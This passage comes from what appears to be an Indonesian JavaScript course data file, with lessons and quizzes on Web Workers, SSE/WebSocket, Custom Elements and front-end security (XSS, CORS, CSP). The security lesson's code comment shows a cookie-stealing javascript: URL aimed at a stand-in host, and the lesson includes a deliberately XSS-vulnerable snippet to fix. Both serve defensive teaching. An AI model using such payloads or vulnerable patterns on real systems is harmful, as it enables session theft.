        {"tanya":"Apa fungsi dari berkas package-lock.json di dalam proyek JavaScript/Node.js?","opsi":["Menyimpan kata sandi basis data produksi agar tidak terbaca publik.","Mengunci pohon dependensi pada versi persis dan checksum integritas yang tepat, sehingga perintah npm ci di mesin pengembang lain maupun server CI/CD menginstal versi paket yang 100% identik.","Menggantikan fungsi berkas index.html.","Mencegah pengembang menambahkan berkas .js baru ke dalam folder proyek."],"benar":1,"penjelasan":"Berkas package.json sering mencantumkan rentang versi (seperti ^1.2.0), sedangkan package-lock.json mencatat versi eksak beserta URL dan hash kriptografis dari setiap paket di dalam pohon dependensi."}
    ]
},
{
    id: 17,
    kategori: "5 · Biner, Worker & Offline",
    judul: "Komputasi Latar Belakang (Web Workers), WebSocket, dan Server-Sent Events (SSE)",
    tingkat: "Lanjut", durasi: "9 mnt",
    tag: ["Web Workers","WebSocket","Server-Sent Events (SSE)"],
    ringkas: "Menjaga antarmuka tetap responsif (INP rendah) dengan memindahkan komputasi CPU berat ke utas latar belakang menggunakan Web Workers, serta membangun fitur waktu nyata (real-time) menggunakan WebSocket dan Server-Sent Events (EventSource).",
    isi: `
<h2>1. Memindahkan Beban Berat dari Utas Utama dengan <em>Web Workers</em></h2>
<p>Ingat bahwa utas utama (<em>Main Thread</em>) di peramban bertanggung jawab atas dua hal sekaligus: <strong>menjalankan JavaScript Anda</strong> DAN <strong>menggambar/merespons interaksi layar (klik, ketikan, animasi)</strong>.</p>
<p>Jika kode JavaScript Anda melakukan pekerjaan CPU yang memakan waktu <code>400 milidetik</code> secara sinkron di utas utama (misalnya menyaring dan mengurutkan 100.000 baris data JSON, mengompresi gambar, atau mengeksekusi penyorot sintaks kode yang sangat besar), maka <strong>selama 400 milidetik tersebut seluruh halaman membeku total</strong>!</p>
<p>Solusinya adalah <strong>Web Workers (<code>new Worker()</code>)</strong>:</p>
<ul><li>Menjalankan skrip JavaScript di dalam **utas sistem operasi terpisah (<em>background thread</em>)** yang benar-benar paralel dengan utas utama!</li><li>Karena terisolasi, <em>Web Worker</em> <strong>tidak memiliki akses langsung ke objek <code>document</code> / DOM</strong> halaman utama.</li><li>Utas utama dan <em>Web Worker</em> berkomunikasi secara aman dengan saling mengirim pesan menggunakan <strong><code>postMessage(data)</code></strong> dan mendengarkan event <strong><code>onmessage</code></strong> (data disalin secara otomatis menggunakan algoritma <em>Structured Clone</em>).</li></ul>
<pre>// === 1. Berkas Pekerja: ./pekerja-analisis.js ===
self.addEventListener(&quot;message&quot;, (event) =&gt; {
  const { daftarAngka } = event.data;

  // Perhitungan berat ini berjalan di utas CPU terpisah tanpa membekukan layar pengguna!
  const terurut = daftarAngka.toSorted((a, b) =&gt; a - b);
  const total = terurut.reduce((acc, n) =&gt; acc + n, 0);

  // Kirimkan hasilnya kembali ke utas utama
  self.postMessage({
    jumlahData: terurut.length,
    rataRata: total / terurut.length,
    median: terurut[Math.floor(terurut.length / 2)]
  });
});</pre>
<pre>// === 2. Berkas Utas Utama: ./app.js ===
// Membuat worker bertipe ES Module
const pekerja = new Worker(new URL(&quot;./pekerja-analisis.js&quot;, import.meta.url), {
  type: &quot;module&quot;
});

pekerja.addEventListener(&quot;message&quot;, (event) =&gt; {
  console.log(&quot;Hasil analisis dari utas latar belakang:&quot;, event.data);
});

pekerja.addEventListener(&quot;error&quot;, (galat) =&gt; {
  console.error(&quot;Terjadi galat di dalam Web Worker:&quot;, galat.message);
});

// Mengirim tugas ke worker
pekerja.postMessage({ daftarAngka: [90, 12, 45, 78, 34, 100, 23] });</pre>
<h2>2. Komunikasi Waktu Nyata (<em>Real-Time</em>): <code>WebSocket</code> vs <code>Server-Sent Events (SSE)</code></h2>
<p>Pada protokol HTTP biasa (<code>fetch()</code>), server hanya bisa mengirim data jika peramban bertanya terlebih dahulu. Bagaimana jika server perlu **mendorong (<em>push</em>) pembaruan secara langsung ke peramban** begitu ada kejadian baru (seperti grafik metrik server langsung, notifikasi kelulusan deployment CI/CD, atau ruang diskusi langsung)?</p>
<p>Ada dua standar web utama yang wajib Anda pahami perbedaannya:</p>
<table><thead><tr><th>Kriteria</th><th><strong>Server-Sent Events (<code>EventSource</code> / SSE)</strong></th><th><strong>WebSocket (<code>new WebSocket()</code>)</strong></th></tr></thead><tbody><tr><td><strong>Arah Komunikasi</strong></td><td>**Satu arah (<em>Unidirectional</em>):** Server → Klien (Klien mengirim aksi lewat <code>fetch()</code> biasa).</td><td>**Dua arah penuh (<em>Full-Duplex Bidirectional</em>):** Klien ↔ Server secara simultan.</td></tr><tr><td><strong>Protokol Jaringan</strong></td><td>Berjalan di atas <strong>HTTP/HTTPS standar</strong> (<code>Content-Type: text/event-stream</code>). Ramah <em>firewall</em> dan HTTP/2!</td><td>Meng-upgrade koneksi ke protokol <strong><code>wss://</code></strong> (WebSocket Secure).</td></tr><tr><td><strong>Sambung Ulang Otomatis</strong></td><td><strong>Sudah bawaan otomatis!</strong> Jika jaringan terputus sebentar, <code>EventSource</code> otomatis menyambung ulang sendiri.</td><td><strong>Harus ditulis manual</strong> dengan logika <em>exponential backoff</em> di JavaScript.</td></tr><tr><td><strong>Kasus Penggunaan Terbaik</strong></td><td>Umpan notifikasi langsung, streaming log CI/CD, pembaruan harga/metrik dasbor, streaming respons AI.</td><td>Gim multipemain waktu nyata, kolaborasi kursor kanvas bersama, aplikasi obrolan frekuensi sangat tinggi.</td></tr></tbody></table>
<h3>A. Menggunakan <code>EventSource</code> (Server-Sent Events)</h3>
<p>Jika kebutuhan Anda hanya menerima aliran pembaruan dari server ke layar pengguna, <strong><code>EventSource</code></strong> jauh lebih sederhana daripada WebSocket:</p>
<pre>const sumberAliran = new EventSource(&quot;/api/aliran-metrik&quot;);

// Mendengarkan pesan standar dari server
sumberAliran.addEventListener(&quot;message&quot;, (event) =&gt; {
  const metrik = JSON.parse(event.data);
  console.log(&quot;Beban CPU terbaru:&quot;, metrik.cpu);
});

// Mendengarkan nama event khusus (mis. &quot;peringatan-kritis&quot;) yang dikirim server
sumberAliran.addEventListener(&quot;peringatan-kritis&quot;, (event) =&gt; {
  console.warn(&quot;Peringatan server:&quot;, JSON.parse(event.data));
});

// Menutup koneksi saat pengguna meninggalkan halaman/komponen
function tutupAliran() {
  sumberAliran.close();
}</pre>
<h3>B. Menggunakan <code>WebSocket</code> untuk Komunikasi Dua Arah</h3>
<pre>// Selalu gunakan skema terenkripsi wss:// di produksi!
const ws = new WebSocket(&quot;wss://kodeloka.asadinedu.com/ws/terminal&quot;);

ws.addEventListener(&quot;open&quot;, () =&gt; {
  console.log(&quot;Tersambung ke terminal interaktif.&quot;);
  ws.send(JSON.stringify({ tipe: &quot;perintah&quot;, isi: &quot;ls -la&quot; }));
});

ws.addEventListener(&quot;message&quot;, (event) =&gt; {
  const pesan = JSON.parse(event.data);
  console.log(&quot;Keluaran terminal:&quot;, pesan.keluaran);
});

ws.addEventListener(&quot;close&quot;, (event) =&gt; {
  console.log(\`Koneksi WebSocket ditutup (kode: \${event.code})\`);
});</pre>
<h2>Latihan Praktik: Pencarian &amp; Pemeringkatan Data Besar di dalam Web Worker</h2>
<p>Buatlah berkas <code>worker-cari.js</code> dan <code>utama-worker.js</code>:</p>
<ol><li>Di dalam <code>worker-cari.js</code>, terima pesan berisi array 10.000 item dan sebuah kata kunci pencarian, lalu hitung skor kecocokan dan urutkan dengan <code>.toSorted()</code> sebelum mengirim 10 hasil teratas lewat <code>self.postMessage()</code>.</li><li>Di dalam <code>utama-worker.js</code>, bungkus komunikasi ke Worker tersebut ke dalam sebuah fungsi yang mengembalikan <code>Promise</code> sehingga dapat dipanggil dengan mudah menggunakan <code>await jalankanDiWorker(data)</code>!</li></ol>
<div class="callout info"><div class="callout-judul">📚 Rujukan</div><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API" rel="noopener">WebSocket API (WebSockets) — MDN Web Docs</a></li><li><a href="https://web.dev/articles/inp" rel="noopener">Interaction to Next Paint (INP) — web.dev</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers" rel="noopener">Using Web Workers — MDN Web Docs</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Server-sent_events/Using_server-sent_events" rel="noopener">Using server-sent events — MDN Web Docs</a></li></ul></div>
`,
    perintah: ["EventSource","WebSocket","fetch()","worker-cari.js","utama-worker.js","400 milidetik"],
    kuis: [
        {"tanya":"Mengapa kode yang berjalan di dalam sebuah Web Worker (new Worker()) tidak diizinkan memanggil document.querySelector() atau mengubah elemen DOM secara langsung?","opsi":["Karena Web Worker tidak mendukung bahasa JavaScript standar.","Demi menjaga keamanan konkurensi (thread safety) pohon DOM agar utas utama dan utas pekerja tidak memodifikasi elemen visual yang sama secara bersamaan (race condition); Web Worker memproses data di latar belakang lalu mengirimkan hasilnya ke utas utama melalui postMessage().","Karena Web Worker hanya memiliki memori maksimal 1 KB.","Karena document hanya tersedia di dalam fungsi async."],"benar":1,"penjelasan":"Pohon DOM di peramban tidak dirancang untuk diakses dari banyak utas sekaligus (not thread-safe). Dengan mengisolasi akses DOM hanya pada utas utama dan menghubungkan Web Worker lewat pengiriman pesan postMessage(), peramban bebas dari deadlock dan race condition visual."},
        {"tanya":"Kapan Anda sebaiknya memilih Server-Sent Events (EventSource / SSE) dibandingkan WebSocket?","opsi":["Ketika Anda membuat gim multipemain 3D yang mengirim koordinat pemain 60 kali per detik dari klien ke server.","Ketika aliran data waktu nyata bersifat satu arah dari server ke peramban (seperti streaming log proses build, dasbor pemantauan metrik, atau notifikasi langsung), karena SSE berjalan di atas HTTP standar dan sudah memiliki fitur sambung-ulang (auto-reconnect) bawaan.","Ketika Anda perlu mengirim data biner suara mikrofon secara terus-menerus dari peramban ke server.","Ketika server tidak mendukung protokol HTTP."],"benar":1,"penjelasan":"Untuk kasus di mana klien hanya perlu mendengarkan dorongan data dari server, EventSource (SSE) jauh lebih ringan, bekerja mulus melalui HTTP/2 tanpa perlu protocol upgrade khusus, dan menangani penyambungan ulang secara otomatis jika koneksi sempat terputus."},
        {"tanya":"Metode apakah yang harus dipanggil pada instans pekerja (const pekerja = new Worker(...)) atau sumberAliran (const sumberAliran = new EventSource(...)) apabila komponen sudah tidak digunakan lagi agar tidak memboroskan sumber daya CPU dan jaringan?","opsi":["pekerja.terminate() untuk menghentikan Web Worker, dan sumberAliran.close() untuk menutup koneksi EventSource.","pekerja.delete() dan sumberAliran.stop().","window.clearWorker(pekerja).","Cukup mengosongkan isi DOM dengan innerHTML = \"\"."],"benar":0,"penjelasan":"Web Worker yang sudah dibuat akan terus hidup di memori sampai worker.terminate() dipanggil dari utas utama (atau self.close() dari dalam worker). Begitu pula koneksi EventSource harus ditutup dengan .close() saat tidak lagi diperlukan."}
    ]
},
{
    id: 18,
    kategori: "5 · Biner, Worker & Offline",
    judul: "Membangun Elemen Kustom Mandiri dengan Web Components (customElements & Shadow DOM)",
    tingkat: "Lanjut", durasi: "9 mnt",
    tag: ["customElements","<tombol-salin>","-"],
    ringkas: "Menciptakan tag HTML kustom milik sendiri (seperti <lencana-status> atau <kartu-kode>) menggunakan standar Custom Elements API (customElements.define), mengelola metode siklus hidup (connectedCallback, disconnectedCallback, attributeChangedCallback), serta mengenkapsulasi DOM dengan attachShadow.",
    isi: `
<h2>1. Apa Itu Custom Elements di JavaScript?</h2>
<p>Pernahkah Anda ingin membuat komponen antarmuka (misalnya tombol salin kode <code>&lt;tombol-salin&gt;</code> atau kartu peringatan <code>&lt;kotak-info&gt;</code>) yang dapat dipakai di halaman mana saja—baik di halaman HTML statis, di proyek PHP, maupun di berbagai framework—cukup dengan menulis tag HTML-nya saja?</p>
<p>Standar <strong>Custom Elements</strong> (bagian dari spesifikasi HTML dan DOM yang berstatus <strong>Baseline Widely Available</strong>) memungkinkan Anda mendaftarkan tag HTML baru ke peramban dengan mewarisi kelas <strong><code>HTMLElement</code></strong>!</p>
<div class="callout waspada"><div class="callout-judul">⚠️ Aturan Wajib Nama Tag Custom Element</div><p>Nama tag elemen kustom <strong>wajib menggunakan huruf kecil dan mengandung minimal satu tanda hubung (<code>-</code>)</strong>—misalnya <code>&lt;kartu-kodeloka&gt;</code>, <code>&lt;tombol-salin&gt;</code>, atau <code>&lt;grafik-metrik&gt;</code>. Mengapa wajib ada tanda hubung <code>-</code>? Agar peramban dan spesifikasi HTML di masa depan dijamin tidak akan pernah bentrok dengan nama elemen bawaan HTML (karena semua elemen bawaan HTML seperti <code>&lt;dialog&gt;</code>, <code>&lt;search&gt;</code>, <code>&lt;article&gt;</code> selalu terdiri dari satu kata tanpa tanda hubung!).</p></div>
<h2>2. Siklus Hidup (<em>Lifecycle Callbacks</em>) Sebuah Custom Element</h2>
<p>Ketika Anda mendefinisikan <code>class KomponenSaya extends HTMLElement</code>, peramban secara otomatis memanggil metode-metode siklus hidup khusus ini:</p>
<table><thead><tr><th>Metode Siklus Hidup</th><th>Kapan Dipanggil oleh Peramban?</th><th>Kegunaan Utama</th></tr></thead><tbody><tr><td><code>constructor()</code></td><td>Saat instans elemen pertama kali diciptakan di memori.</td><td>Membuat Shadow Root (<code>this.attachShadow({ mode: &quot;open&quot; })</code>) atau menginisialisasi state internal. Jangan mengakses atribut/anak di sini!</td></tr><tr><td><strong><code>connectedCallback()</code></strong></td><td>Setiap kali elemen <strong>dimasukkan ke dalam dokumen DOM aktif</strong>.</td><td><strong>Tempat utama untuk merender tampilan</strong>, membaca atribut awal, dan memasang <em>event listener</em>!</td></tr><tr><td><strong><code>disconnectedCallback()</code></strong></td><td>Setiap kali elemen <strong>dicabut/dihapus dari dokumen DOM</strong>.</td><td><strong>Tempat wajib untuk membersihkan sumber daya:</strong> menghapus timer <code>clearInterval</code>, memutus <code>IntersectionObserver.disconnect()</code>, atau menutup koneksi!</td></tr><tr><td><strong><code>static observedAttributes</code></strong> &amp; <strong><code>attributeChangedCallback(nama, nilaiLama, nilaiBaru)</code></strong></td><td>Setiap kali salah satu atribut yang terdaftar di dalam <code>observedAttributes</code> ditambahkan, diubah, atau dihapus.</td><td>Memperbarui tampilan komponen secara reaktif saat atribut HTML-nya diubah!</td></tr></tbody></table>
<h2>3. Contoh Lengkap: Membangun Komponen <code>&lt;tombol-salin&gt;</code> yang Mandiri</h2>
<p>Mari kita bangun sebuah elemen kustom <code>&lt;tombol-salin target=&quot;#kode-1&quot;&gt;&lt;/tombol-salin&gt;</code> yang lengkap dengan isolasi gaya Shadow DOM, penyalinan ke papan klip (<code>navigator.clipboard.writeText</code>), dan pembersihan timer yang aman:</p>
<pre>class TombolSalin extends HTMLElement {
  // 1. Daftarkan atribut mana saja yang perubahannya ingin kita pantau
  static observedAttributes = [&quot;label&quot;];

  #shadow;
  #timerReset = null;

  constructor() {
    super();
    // 2. Buat Shadow DOM terisolasi agar gaya tombol tidak terpengaruh CSS luar
    this.#shadow = this.attachShadow({ mode: &quot;open&quot; });
  }

  connectedCallback() {
    this.#render();
    this.#shadow
      .querySelector(&quot;button&quot;)
      ?.addEventListener(&quot;click&quot;, () =&gt; this.#salinTeks());
  }

  disconnectedCallback() {
    // 3. Bersihkan timer jika elemen dihapus dari DOM sebelum 2 detik selesai
    clearTimeout(this.#timerReset);
  }

  attributeChangedCallback(nama, nilaiLama, nilaiBaru) {
    if (nama === &quot;label&quot; &amp;&amp; nilaiLama !== nilaiBaru) {
      const span = this.#shadow.querySelector(&quot;.teks-label&quot;);
      if (span) span.textContent = nilaiBaru ?? &quot;Salin Kode&quot;;
    }
  }

  async #salinTeks() {
    const selektorTarget = this.getAttribute(&quot;target&quot;);
    const elemenKode = selektorTarget ? document.querySelector(selektorTarget) : null;
    if (!elemenKode) return;

    const spanLabel = this.#shadow.querySelector(&quot;.teks-label&quot;);
    try {
      await navigator.clipboard.writeText(elemenKode.textContent ?? &quot;&quot;);
      spanLabel.textContent = &quot;✓ Tersalin!&quot;;

      clearTimeout(this.#timerReset);
      this.#timerReset = setTimeout(() =&gt; {
        spanLabel.textContent = this.getAttribute(&quot;label&quot;) ?? &quot;Salin Kode&quot;;
      }, 2000);
    } catch {
      spanLabel.textContent = &quot;Gagal menyalin&quot;;
    }
  }

  #render() {
    const labelAwal = this.getAttribute(&quot;label&quot;) ?? &quot;Salin Kode&quot;;

    this.#shadow.innerHTML = \`
      &lt;style&gt;
        button {
          display: inline-flex;
          align-items: center;
          gap: 0.4rem;
          padding: 0.35rem 0.75rem;
          border: 1px solid #cbd5e1;
          border-radius: 0.375rem;
          background: #ffffff;
          color: #0f172a;
          font: inherit;
          font-size: 0.8125rem;
          font-weight: 600;
          cursor: pointer;
        }
        button:hover {
          background: #f1f5f9;
        }
      &lt;/style&gt;
      &lt;button type=&quot;button&quot;&gt;
        &lt;span class=&quot;teks-label&quot;&gt;&lt;/span&gt;
      &lt;/button&gt;
    \`;

    // Gunakan textContent untuk menyisipkan nilai atribut secara aman dari XSS!
    this.#shadow.querySelector(&quot;.teks-label&quot;).textContent = labelAwal;
  }
}

// 4. Daftarkan tag &lt;tombol-salin&gt; ke registri elemen kustom peramban!
if (!customElements.get(&quot;tombol-salin&quot;)) {
  customElements.define(&quot;tombol-salin&quot;, TombolSalin);
}</pre>
<p>Begitu skrip di atas dimuat, Anda dapat langsung menggunakan <code>&lt;tombol-salin&gt;</code> di mana saja di dalam HTML:</p>
<pre>&lt;pre id=&quot;blok-perintah&quot;&gt;&lt;code&gt;docker compose up -d --build&lt;/code&gt;&lt;/pre&gt;
&lt;tombol-salin target=&quot;#blok-perintah&quot; label=&quot;Salin Perintah Docker&quot;&gt;&lt;/tombol-salin&gt;</pre>
<h2>Latihan Praktik: Membangun Komponen <code>&lt;lencana-status&gt;</code> Reaktif</h2>
<p>Buatlah berkas <code>custom-element.html</code> dan <code>lencana-status.js</code>:</p>
<ol><li>Buat <code>class LencanaStatus extends HTMLElement</code> dengan <code>static observedAttributes = [&quot;jenis&quot;, &quot;teks&quot;]</code>.</li><li>Ketika atribut <code>jenis</code> bernilai <code>&quot;sehat&quot;</code>, <code>&quot;waspada&quot;</code>, atau <code>&quot;kritis&quot;</code>, perbarui warna indikator di dalam Shadow DOM secara otomatis melalui <code>attributeChangedCallback</code>.</li><li>Daftarkan dengan <code>customElements.define(&quot;lencana-status&quot;, LencanaStatus)</code> dan uji perubahan atributnya melalui <code>setAttribute(&quot;jenis&quot;, &quot;kritis&quot;)</code>.</li></ol>
<div class="callout info"><div class="callout-judul">📚 Rujukan</div><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_components" rel="noopener">Web Components — MDN Web Docs</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_components/Using_custom_elements" rel="noopener">Using custom elements — MDN Web Docs</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_components/Using_shadow_DOM" rel="noopener">Using shadow DOM — MDN Web Docs</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_components/Using_templates_and_slots" rel="noopener">Using templates and slots — MDN Web Docs</a></li></ul></div>
`,
    perintah: ["<tombol-salin>","-","<kotak-info>","HTMLElement","<kartu-kodeloka>","<grafik-metrik>"],
    kuis: [
        {"tanya":"Mengapa pendaftaran customElements.define(\"kartu\", KartuKelas) akan langsung ditolak oleh peramban dengan galat SyntaxError?","opsi":["Karena huruf pertama \"kartu\" tidak menggunakan huruf kapital.","Karena spesifikasi Custom Elements mewajibkan setiap nama tag elemen kustom mengandung minimal satu karakter tanda hubung (-) (seperti \"kartu-kelas\") agar tidak pernah berbenturan dengan nama elemen HTML standar masa kini maupun masa depan.","Karena customElements.define hanya menerima maksimal 5 huruf.","Karena class KartuKelas belum diekspor."],"benar":1,"penjelasan":"Semua elemen standar HTML terdiri dari satu kata tanpa tanda hubung (<div>, <dialog>, <section>). Kewajiban menyertakan tanda hubung (-) pada nama Custom Element menjamin ruang nama (namespace) elemen buatan pengembang terpisah dari elemen bawaan HTML."},
        {"tanya":"Agar metode attributeChangedCallback(name, oldValue, newValue) pada sebuah Custom Element terpanggil ketika atribut data-status atau tingkat diubah, apa yang wajib dideklarasikan di dalam class tersebut?","opsi":["Properti atau getter statis static observedAttributes = [\"data-status\", \"tingkat\"];.","Sebuah MutationObserver manual di dalam constructor().","Metode watchAllAttributes().","Atribut observable=\"true\" pada tag HTML-nya."],"benar":0,"penjelasan":"Demi efisiensi performa, peramban hanya memicu attributeChangedCallback untuk atribut-atribut yang namanya didaftarkan secara eksplisit di dalam array statis static observedAttributes (atau static get observedAttributes())."},
        {"tanya":"Di dalam metode siklus hidup manakah Anda harus membersihkan pengatur waktu (clearInterval), menghentikan ResizeObserver, atau melepas pendengar event global ketika sebuah Custom Element dihapus dari halaman?","opsi":["constructor()","connectedCallback()","disconnectedCallback()","adoptedCallback()"],"benar":2,"penjelasan":"disconnectedCallback() dipanggil oleh peramban tepat ketika elemen kustom dicabut dari dokumen DOM. Membersihkan timer dan pendengar eksternal di dalam metode ini mencegah kebocoran memori (memory leak)."}
    ]
},
{
    id: 19,
    kategori: "6 · Keamanan & Kualitas",
    judul: "Keamanan Front-End: Pencegahan DOM-Based XSS, CORS, dan Content Security Policy (CSP)",
    tingkat: "Lanjut", durasi: "9 mnt",
    tag: ["textContent","new URL()","jebakan.com"],
    ringkas: "Melindungi pengguna aplikasi web dari serangan DOM-based Cross-Site Scripting (XSS) dengan menghindari sink berbahaya (innerHTML, eval, URL javascript:), memahami mekanisme Same-Origin Policy dan CORS, serta menerapkan pertahanan berlapis dengan Content Security Policy (CSP).",
    isi: `
<h2>Mengapa Kode Front-End Bisa Menjadi Pintu Masuk Penyerang?</h2>
<p>Di sisi front-end, kode JavaScript Anda berjalan langsung di dalam peramban pengguna dengan hak akses penuh terhadap halaman tersebut: ia dapat membaca isi halaman, mengirim permintaan jaringan atas nama pengguna yang sedang login, dan mengubah tampilan formulir.</p>
<p>Jika kode JavaScript Anda mengambil teks yang tidak tepercaya—misalnya dari parameter URL (<code>location.search</code>), respons API yang memuat komentar pengguna lain, atau pesan lintas jendela—lalu memasukkannya secara mentah ke dalam DOM menggunakan metode yang mengeksekusi HTML/kode, maka terjadilah <strong>DOM-Based Cross-Site Scripting (DOM XSS)</strong>!</p>
<h2>1. Sumber (<em>Sources</em>) dan Muara Berbahaya (<em>Dangerous Sinks</em>) pada DOM XSS</h2>
<p>Untuk mencegah DOM XSS, pisahkan dengan tegas antara <strong>Data Teks</strong> dan <strong>Kode yang Dieksekusi</strong>:</p>
<table><thead><tr><th>Muara Berbahaya (<em>Dangerous Sinks</em> — HINDARI untuk Data Pengguna!)</th><th>Alternatif yang Aman (<em>Safe Alternatives</em>)</th></tr></thead><tbody><tr><td><code>elemen.innerHTML = data</code></td><td><strong><code>elemen.textContent = data</code></strong></td></tr><tr><td><code>elemen.outerHTML = data</code> / <code>insertAdjacentHTML(..., data)</code></td><td><strong><code>document.createElement(...)</code></strong> + <strong><code>textContent</code></strong> + <strong><code>append()</code></strong></td></tr><tr><td><code>document.write(data)</code></td><td>Jangan pernah gunakan <code>document.write()</code> di web modern!</td></tr><tr><td><code>eval(data)</code> / <code>new Function(data)</code></td><td><strong><code>JSON.parse(data)</code></strong> untuk data JSON.</td></tr><tr><td><code>setTimeout(&quot;kodeString&quot;, 100)</code></td><td>Selalu kirimkan <strong>fungsi</strong> (<code>setTimeout(() =&gt; {...}, 100)</code>), bukan string!</td></tr><tr><td><code>tautan.href = urlDariPengguna</code></td><td>Validasi protokol URL terlebih dahulu dengan <code>new URL()</code> (pastikan hanya <code>https:</code> atau <code>http:</code>)!</td></tr></tbody></table>
<h3>Jebakan Berbahaya: XSS Lewat Atribut <code>href=&quot;javascript:...&quot;</code>!</h3>
<p>Banyak pengembang sudah patuh memakai <code>textContent</code> untuk teks tautan, tetapi lupa memvalidasi atribut <strong><code>href</code></strong> yang berasal dari input profil pengguna:</p>
<pre>// BAHAYA! Jika pengguna mengisi urlWebsite = &quot;javascript:fetch('https://jahat.com/?c='+document.cookie)&quot;
// maka saat pengguna lain mengeklik tautan tersebut, kode JavaScript jahat langsung dieksekusi!
tautanProfil.href = dataPengguna.urlWebsite;

// AMAN: Selalu validasi bahwa protokol URL hanya boleh 'https:' atau 'http:' menggunakan konstruktor URL!
function pasangTautanAman(elemenAnchor, inputUrl) {
  try {
    const urlTerurai = new URL(inputUrl);
    if (urlTerurai.protocol !== &quot;https:&quot; &amp;&amp; urlTerurai.protocol !== &quot;http:&quot;) {
      throw new Error(&quot;Protokol URL tidak diizinkan.&quot;);
    }
    elemenAnchor.href = urlTerurai.href;
    elemenAnchor.rel = &quot;noopener noreferrer&quot;;
  } catch {
    elemenAnchor.removeAttribute(&quot;href&quot;);
  }
}</pre>
<h2>2. Memahami <em>Same-Origin Policy (SOP)</em> dan <em>CORS</em></h2>
<p>Pernahkah Anda memanggil <code>fetch(&quot;https://api-lain.com/data&quot;)</code> dari <code>http://localhost:8790</code> lalu melihat pesan galat merah di konsol: <code>Access to fetch at 'https://api-lain.com/data' from origin 'http://localhost:8790' has been blocked by CORS policy</code>?</p>
<p>Penting untuk memahami <strong>mengapa</strong> peramban memiliki aturan ini:</p>
<ol><li>**Apa itu <em>Origin</em>?** Dua URL memiliki <em>origin</em> yang sama <strong>hanya jika ketiga komponen ini identik persis</strong>: <strong>Skema/Protokol</strong> (<code>https</code>), <strong>Host/Domain</strong> (<code>kodeloka.asadinedu.com</code>), dan <strong>Port</strong> (<code>443</code>).</li><li>**Mengapa ada <em>Same-Origin Policy (SOP)</em>?** Bayangkan Anda sedang login ke bank Anda di satu tab, lalu di tab lain Anda tidak sengaja membuka situs berita palsu <code>jebakan.com</code>. Tanpa <em>Same-Origin Policy</em>, skrip di <code>jebakan.com</code> bisa diam-diam memanggil <code>fetch(&quot;https://bank-anda.com/api/saldo&quot;)</code> dan membaca seluruh isi rekening Anda! SOP mencegah situs A membaca balasan dari situs B.</li><li>**Apa itu CORS (<em>Cross-Origin Resource Sharing</em>)?<strong> Ketika Anda memang memiliki arsitektur resmi di mana front-end di <code>https://app.contoh.id</code> perlu membaca data dari server API Anda di <code>https://api.contoh.id</code>, maka </strong>server API (<code>api.contoh.id</code>)** harus menyertakan header HTTP respons yang mengizinkan origin tersebut:</li></ol>
<pre>Access-Control-Allow-Origin: https://app.contoh.id
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization</pre>
<div class="callout info"><div class="callout-judul">💡 Fakta Penting Debugging CORS</div><p>Galat CORS <strong>tidak bisa diperbaiki dengan mengubah kode <code>fetch()</code> di front-end</strong>, karena kebijakan CORS ditegakkan oleh peramban berdasarkan <strong>header HTTP yang dikirim oleh server tujuan</strong> (atau melalui konfigurasi <em>reverse proxy</em> seperti Nginx di depan server).</p></div>
<h2>3. Pertahanan Berlapis dengan <em>Content Security Policy (CSP)</em></h2>
<p>Bagaimana jika meskipun tim sudah berhati-hati, tetap ada satu celah XSS yang lolos di salah satu halaman? Kita menerapkan pertahanan lapis kedua menggunakan header HTTP <strong>Content Security Policy (<code>Content-Security-Policy</code>)</strong> yang dikirim oleh server (Kodeloka sendiri mengirim CSP lewat berkas <code>_headers</code>, tetapi kebijakannya lebih longgar karena mesin kelasnya memakai skrip dan gaya inline sehingga masih memakai <code>'unsafe-inline'</code>; contoh di bawah adalah bentuk yang lebih ketat):</p>
<pre>Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data: https:; object-src 'none'; base-uri 'self'; frame-ancestors 'none'</pre>
<p>Dengan kebijakan CSP di atas:</p>
<ul><li><strong><code>script-src 'self'</code>:</strong> Peramban <strong>hanya</strong> mengizinkan eksekusi berkas <code>.js</code> yang dimuat dari domain situs itu sendiri (<code>'self'</code>).</li><li><strong>Semua skrip inline (<code>&lt;script&gt;...&lt;/script&gt;</code> liar, <code>onclick=&quot;...&quot;</code>, <code>onerror=&quot;...&quot;</code>, dan <code>eval()</code>) otomatis diblokir oleh peramban!</strong> Jadi meskipun penyerang berhasil menyuntikkan <code>&lt;img src=&quot;x&quot; onerror=&quot;curiData()&quot;&gt;</code> ke halaman Anda, peramban menolak menjalankan kode <code>onerror</code> tersebut!</li></ul>
<h2>Latihan Praktik: Mengaudit dan Memperbaiki Kode Front-End yang Rentan XSS</h2>
<p>Perhatikan potongan kode berbahaya berikut:</p>
<pre>// KODE RENTAN:
const parameter = new URLSearchParams(window.location.search);
const nama = parameter.get(&quot;nama&quot;);
const situs = parameter.get(&quot;situs&quot;);
document.querySelector(&quot;#sapaan&quot;).innerHTML = \`Selamat datang, &lt;b&gt;\${nama}&lt;/b&gt;! &lt;a href=&quot;\${situs}&quot;&gt;Kunjungi profil&lt;/a&gt;\`;</pre>
<p>Buatlah berkas <code>perbaikan-xss.js</code> yang menulis ulang logika di atas menggunakan <code>document.createElement</code>, <code>textContent</code>, dan fungsi validasi protokol <code>new URL()</code> sehingga 100% kebal terhadap suntikan <code>&lt;script&gt;</code> maupun URL <code>javascript:alert(1)</code>.</p>
<div class="callout info"><div class="callout-judul">📚 Rujukan</div><ul><li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" rel="noopener">Cross Site Scripting Prevention Cheat Sheet — OWASP</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP" rel="noopener">Content Security Policy (CSP) — MDN Web Docs</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy" rel="noopener"><code>Content-Security-Policy</code> header — MDN Web Docs</a></li></ul></div>
`,
    perintah: ["textContent","new URL()","jebakan.com","location.search","elemen.innerHTML = data","elemen.textContent = data"],
    kuis: [
